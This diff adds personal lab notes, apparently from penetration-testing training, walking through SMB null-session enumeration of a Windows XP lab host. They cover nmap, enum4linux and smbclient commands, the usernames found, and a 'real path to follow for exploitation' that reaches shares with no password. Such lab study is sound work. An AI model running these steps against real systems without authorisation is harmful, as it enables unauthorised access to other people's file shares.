@@ -1,0 +1,76 @@
+NULL SESSION LAB WALKTHROUGH 
+
+Tools: enum4linux / samrdump / smbclient / nmap 
+
+Subnet: 192.168.99.0/24
+
+Target IP: 192.168.99.162
+
+
+Enumeration: 
+
+	- Nmap 
+
+		sudo nmap -sC -sV -oA ./null_session 192.168.99.162
+
+		- also performed the script on the smb service 
+
+		- found: 
+
+			OS: Windows XP 2000 Lan Manager 
+
+			Computer Name: els-winxp
+	
+			NetBIOS computer name: ELS-WINXP\x00
+
+			Workgroup: WORKGROUP\x00
+
+			smb-security-mode: 
+
+				account_used: guest 
+
+				authentication_level: user 
+
+	- enum4linux 
+
+		enum4linux -o 192.168.99.162
+
+
+		Findings: 
+
+			Username: ''
+			Password: ''
+
+			Known Usernames: administrator, guest, krbtgt, domain admins, root, bin 
+
+			***User Found: Frank***
+
+
+		- Gather more information with enum4linux 
+
+			enum4linux -a 192.168.99.162
+
+			
+
+	- smbclient 
+
+		- access shares with : 
+		
+		smbclient -L WORKGROUP -I 192.168.99.162 -N -U ""
+
+
+
+
+REAL PATH TO FOLLOW FOR EXPLOITATION 
+
+
+	1. enum4linux to see all the shares of the machines 
+
+		enum4linux -a <targetIP> 
+
+
+	2. Once you have the shares you can use the smbclient 
+
+		smbclient \\\\192.168.99.162\\<share of choosing> -N 
+
+		-N = no password 
